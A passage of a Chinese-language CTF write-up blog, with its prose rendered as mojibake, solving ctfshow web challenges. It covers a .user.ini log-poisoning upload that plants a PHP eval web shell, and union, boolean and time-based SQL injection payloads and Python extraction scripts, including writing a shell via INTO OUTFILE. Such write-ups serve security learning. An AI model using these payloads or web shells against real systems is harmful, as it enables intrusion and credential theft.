class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file=/var/<span class="keyword">log</span>/nginx/<span class="keyword">access</span>.<span class="keyword">log</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦ä¸Šä¼ ä¸€ä¸ªindex.phpæ–‡ä»¶ï¼Œå†…å®¹è°ä¾¿å¡«å†™å³å¯ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>185</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?=eval($_POST[1]);?&gt;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryMmAfVSTikIwEpnAY</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://90cfa445-bcd9-4f2f-8ea3-0e89ebd2d6b0.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;index.php&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql"><span class="number">123</span></span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryMmAfVSTikIwEpnAY--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure><h3><span id="sql-æ³¨å…¥">SQL æ³¨å…¥</span></h3><p><strong>çŸ¥è¯†ç‚¹</strong></p><ul><li><code>%23 </code>ç›¸å½“äº # å¯ä»¥æ³¨é‡Šåé¢çš„è¯­å¥ï¼ŒåŒç†<code> --+</code>ä¹Ÿä»£è¡¨æ³¨é‡Š</li></ul><p><strong>sqlmap</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://789aa550-e618-4859-a737-146010bc76ee.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;python sqlmap.py -u &quot;<span class="subst">&#123;url&#125;</span>api/index.php&quot; --method=&quot;PUT&quot; --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;<span class="subst">&#123;url&#125;</span>api/getToken.php&quot; --safe-freq=1 --tamper=web210.py --tables&#x27;</span></span><br><span class="line"></span><br><span class="line">payload</span><br></pre></td></tr></table></figure><h4><span id="web171">web171</span></h4><p>æŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27; limit 1;&quot;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥æ•°æ®åº“åï¼š</p><ul><li>-1 æ˜¯ä¸ºäº†æŸ¥è¯¢ä¸åœ¨è¡¨ä¸­çš„æ•°æ®ï¼Œä½¿å¾—åªæ˜¾ç¤ºæˆ‘ä»¬éœ€è¦çš„æ•°æ®</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;u</span>nion <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() --+</span><br></pre></td></tr></table></figure><p>æŸ¥è¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;ctfshow_web&quot; --+</span></span><br></pre></td></tr></table></figure><p>æŸ¥åˆ—åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;ctfshow_user&quot; --+</span></span><br></pre></td></tr></table></figure><p>çˆ†å­—æ®µï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1&#x27;u</span>nion <span class="keyword">select</span> id,username,password <span class="keyword">from</span> ctfshow_user --+</span><br></pre></td></tr></table></figure><h4><span id="web172">web172</span></h4><p>ç”¨æˆ·åæ˜¯flagåˆ™ä¸ç»™è¾“å‡º</p><ul><li><p>æ–¹æ³•ä¸€ï¼šç›´æ¥ä½¿ç”¨å…¶ä»–å­—æ®µä»£æ›¿username</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username =&#x27;</span>flag<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,password <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="comment">--+</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select 1,password from ctfshow_user2 where username =&#x27;</span>flag</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šä½¿ç”¨to_base64ã€hexç­‰ç­‰æ–¹æ³•åŠ å¯†username</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select to_base64(username),password from ctfshow_user2  --+</span></span><br></pre></td></tr></table></figure></li></ul><h4><span id="web174">web174</span></h4><ul><li><p>æ–¹æ³•ä¸€ï¼šæ›¿æ¢</p><p>è¿”å›é€»è¾‘åˆ¤æ–­äº†ä¸èƒ½åŒ…å«æ•°å­—å’Œflagï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆbase64ç¼–ç ï¼Œå†å¯¹æ•°å­—è¿›è¡Œæ›¿æ¢ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span>numA<span class="string">&#x27;),&#x27;</span><span class="number">2</span><span class="string">&#x27;,&#x27;</span>numB<span class="string">&#x27;),&#x27;</span><span class="number">3</span><span class="string">&#x27;,&#x27;</span>numC<span class="string">&#x27;),&#x27;</span><span class="number">4</span><span class="string">&#x27;,&#x27;</span>numD<span class="string">&#x27;),&#x27;</span><span class="number">5</span><span class="string">&#x27;,&#x27;</span>numE<span class="string">&#x27;),&#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span>numF<span class="string">&#x27;),&#x27;</span><span class="number">7</span><span class="string">&#x27;,&#x27;</span>numG<span class="string">&#x27;),&#x27;</span><span class="number">8</span><span class="string">&#x27;,&#x27;</span>numH<span class="string">&#x27;),&#x27;</span><span class="number">9</span><span class="string">&#x27;,&#x27;</span>numI<span class="string">&#x27;),&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span>numJ<span class="string">&#x27;) from ctfshow_user4 where username=&#x27;</span>flag<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹çˆ†å‡ºçš„å­—ç¬¦ä¸²åå‘æ›¿æ¢ä»¥ä¸‹å°±è¡Œäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;YnumCRmcnumBhvdnumCsnumCOTknumEMDdkNynumAhMWIxLTRiYzQtOTEnumJYinumJnumCMWJiZTBlNjFhZTRnumI&quot;</span></span><br><span class="line">flag=flagstr.replace(<span class="string">&#x27;numA&#x27;</span>,<span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;numB&#x27;</span>,<span class="string">&#x27;2&#x27;</span>).replace(<span class="string">&#x27;numC&#x27;</span>,<span class="string">&#x27;3&#x27;</span>).replace(<span class="string">&#x27;numD&#x27;</span>,<span class="string">&#x27;4&#x27;</span>).replace(<span class="string">&#x27;numE&#x27;</span>,<span class="string">&#x27;5&#x27;</span>).replace(<span class="string">&#x27;numF&#x27;</span>,<span class="string">&#x27;6&#x27;</span>).replace(<span class="string">&#x27;numG&#x27;</span>,<span class="string">&#x27;7&#x27;</span>).replace(<span class="string">&#x27;numH&#x27;</span>,<span class="string">&#x27;8&#x27;</span>).replace(<span class="string">&#x27;numI&#x27;</span>,<span class="string">&#x27;9&#x27;</span>).replace(<span class="string">&#x27;numJ&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag))</span><br></pre></td></tr></table></figure><p>æˆ–è€…ç”¨å…¶ä»–ç¬¦å·ä»£æ›¿</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;)&#x27;</span>),<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;(&#x27;</span>),<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;*&#x27;</span>),<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>),<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;^&#x27;</span>),<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;%&#x27;</span>),<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;$&#x27;</span>),<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;#&#x27;</span>),<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;@&#x27;</span>),<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line"># &quot;a1b2c3d4e5&quot; <span class="operator">=</span><span class="operator">&gt;</span> &quot;a!b@c3d4e5&quot;</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šç›²æ³¨</p><blockquote><p>flagæ ¼å¼ctfshow{xxxxxxxx(8)-xxxx(4)-xxxx(4)-xxxx(4)-xxxxxxxxxxxx(12)}<br>å…¶ä¸­æ¯ä¸ª x æ˜¯ 0-9 æˆ– a-f èŒƒå›´å†…çš„ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—ã€‚</p></blockquote><p>ä»£ç ä¸­ä½¿ç”¨æ³¨é‡Šâ€œ&#x2F;**&#x2F;â€å°†ç©ºæ ¼æ›¿æ¢æ‰ï¼Œä»¥é¿å…URLç¼–ç å¯èƒ½å¯¼è‡´çš„é—®é¢˜ã€‚</p><ul><li><p>å¸ƒå°”ç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show//api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid=string.ascii_lowercase+<span class="string">&quot;-&#125;&#123;&quot;</span>+string.digits</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:    </span><br><span class="line">        payload = <span class="string">&quot;and ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;) from &#123;0&#125; for 1))=&#123;1&#125;--%20&amp;page=1&amp;limit=10&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>).<span class="built_in">format</span>(i,<span class="built_in">ord</span>(j))</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>trimç›²æ³¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Kradress</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show/api/v4.php?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">uuid=string.ascii_lowercase+<span class="string">&quot;-&#125;&#123;&quot;</span>+string.digits</span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">46</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> uuid:    </span><br><span class="line">        payload = <span class="string">f&quot;and trim(leading &#x27;<span class="subst">&#123;flag&#125;</span><span class="subst">&#123;j&#125;</span>&#x27; from (select group_concat(password) from ctfshow_user4 where username = &#x27;flag&#x27;))=trim(leading &#x27;<span class="subst">&#123;flag&#125;</span>.&#x27; from (select group_concat(password) from ctfshow_user4 where username = &#x27;flag&#x27;))--%20&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        res = requests.get(url+payload)</span><br><span class="line">        <span class="built_in">print</span>(j)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag=&quot;</span>,flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h4><span id="web175">web175</span></h4><p><code>if(!preg_match(&#39;/[\x00-\x7f]/i&#39;, json_encode($ret)))</code></p><p><strong>\xnn åŒ¹é…ASCIIä»£ç ä¸­åå…­è¿›åˆ¶ä»£ç ä¸ºnnçš„å­—ç¬¦<br>[\x00-\x7f] åŒ¹é…ASCIIå€¼ä»0-127çš„å­—ç¬¦</strong></p><p>æ‰€ä»¥ASCIIå€¼å¾—0-127éƒ½è¢«è¿‡æ»¤äº†ï¼Œselectæ²¡æ³•ç”¨äº†ã€‚</p><ul><li><p>æ–¹æ³•ä¸€ï¼šå†™æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(password) from ctfshow_user5 into outfile &#x27;/var/www/html/1.txt&#x27;-- -</span><br></pre></td></tr></table></figure><p>ç„¶åè®¿é—®1.txtå¯ä»¥è·å¾—flag</p></li><li><p>æ–¹æ³•äºŒï¼šå†™shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&#x27;&lt;?=eval($_POST[1])?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27; --+</span><br></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿ä¸ä¸Šå°±é‡æ–°è¯•ä¸€ä¸‹ï¼Œå‘ç°<code>/var/www/html/api/config.php</code>ä¸­æœ‰é…ç½®æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-01 14:21:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-11-01 19:29:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$dbhost</span> =<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbpwd</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;ctfshow_web&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$charName</span> = <span class="string">&quot;utf-8&quot;</span>; </span><br></pre></td></tr></table></figure><p>é€šè¿‡èšå‰‘è¿æ¥æ•°æ®åº“</p><p><img src="/2023/04/19/ctfshow-Web%E7%AF%87/disda/Desktop/Disda/hexo/source/_posts/ctfshow-Web%E7%AF%87/image-20230524163039803.png" alt="image-20230524163039803"></p></li><li><p>æ–¹æ³•ä¸‰ï¼šæ—¶é—´ç›²æ³¨</p><p><code>1&#39; and sleep(6)--+</code>è¯•ä¸€ä¸‹ï¼Œå‘ç°æœ‰å»¶è¿Ÿï¼Œå¯ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚</p><blockquote><p>å‘ç°ç¡®å®æœ‰å»¶è¿Ÿï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘æ—¶é—´ç›²æ³¨ã€‚<br>æ—¶é—´ç›²æ³¨ï¼š<br>é€šè¿‡æ—¶é—´å‡½æ•°ä½¿SQLè¯­å¥æ‰§è¡Œæ—¶é—´å»¶é•¿ï¼Œä»é¡µé¢å“åº”æ—¶é—´åˆ¤æ–­æ¡ä»¶æ˜¯å¦æ­£ç¡®çš„ä¸€ç§æ³¨å…¥æ–¹å¼ã€‚ç®€å•è¯´å°±æ˜¯ï¼Œå½“é¡µé¢å‡ºç°å»¶æ—¶å“åº”ï¼Œä¸”å“åº”æ—¶é—´ä¸è®¾å®šçš„æ—¶é—´å‡½æ•°ä¸€è‡´ï¼Œåˆ™è¡¨ç¤ºå‰åŠéƒ¨åˆ†çš„çŒœæµ‹æ­£ç¡®ï¼Œè‹¥å‡ºç°æŸ¥è¯¢ç›´æ¥è¿”å›ç»“æœï¼Œé¡µé¢å“åº”æœªå‡ºç°å»¶è¿Ÿï¼Œåˆ™è¯´æ˜æœªæ‰§è¡Œåˆ°æ—¶é—´å‡½æ•°çš„éƒ¨åˆ†ï¼Œandçš„åˆ¤æ–­ä¸­ï¼Œå‰åŠéƒ¨åˆ†å°±å·²ç»å‡ºé”™äº†ã€‚<br>åˆ©ç”¨è„šæœ¬æ¥è·å–flagã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    @Author disda</span></span><br><span class="line"><span class="string">    @Date 2023/5/24 16:46</span></span><br><span class="line"><span class="string">    @Describe </span></span><br><span class="line"><span class="string">    @Dependency</span></span><br><span class="line"><span class="string">    @Version 1.0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://74c7c36e-f70f-4d72-b9a8-1c4ca45b3b35.challenge.ctf.show/api/v5.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span> - <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> == j:</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload = <span class="string">&quot;?id=&#x27; union select &#x27;a&#x27;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),%d,1))&lt;%d,sleep(0.5),1) -- -&quot;</span> % (i, j)</span><br><span class="line">        start_time = time()</span><br><span class="line">        r = requests.get(url=url + payload).text</span><br><span class="line">        end_time = time()</span><br><span class="line">        <span class="comment"># print(r)</span></span><br><span class="line">        <span class="keyword">if</span> end_time - start_time &gt; <span class="number">0.48</span>:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web176">web176</span></h4><p>çŸ¥é“æœ‰è¿‡æ»¤ï¼Œä½†ä¸çŸ¥é“è¿‡æ»¤çš„æ˜¯è°ï¼Œæ‰€ä»¥éœ€è¦å°è¯•ä¸€ä¸‹ã€‚<br>é¦–å…ˆä¼ å…¥<code>1â€™--+</code>ï¼Œæœ‰å›æ˜¾ã€‚<br>ä¼ å…¥<code>1â€™ --+</code>ï¼Œæœ‰å›æ˜¾ï¼Œç©ºæ ¼æ²¡è¢«è¿‡æ»¤ã€‚<br>ä¼ å…¥<code>1&#39; union select database(),2,3 --+</code><br>æ˜¾ç¤ºä¸å‡ºæ•°æ®åº“ï¼ŒçŒœæµ‹æœ‰çš„å­—æ¯è¢«è¿‡æ»¤ï¼Œéƒ½è¯•äº†ä¸€ä¸‹ï¼Œäºæ˜¯å‘ç°å½“ä¼ å…¥<code>1&#39; union Select database(),2,3 --+</code><br>è¯´æ˜æ˜¯selectè¢«è¿‡æ»¤ï¼Œä½†å¤§å°å†™å¯ç»•è¿‡ï¼Œæ‰€ä»¥ç›´æ¥ä¼ å…¥<br><code>-1&#39; union Select password,2,3 from ctfshow_user --+</code></p><p>å¾—åˆ°flagã€‚</p><h4><span id="web177">web177</span></h4><p>å°è¯•äº†ä¸‰ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1â€™--+</span><br><span class="line">1â€™%23</span><br><span class="line">1â€™ %23</span><br></pre></td></tr></table></figure><p>ç¡®å®šäº†è¿‡æ»¤äº†ç©ºæ ¼å’Œâ€“+ï¼Œå¯ä»¥ç”¨%0aå’Œ%23ä»£æ›¿ã€‚</p><ul><li>ä¸‡èƒ½å¯†ç 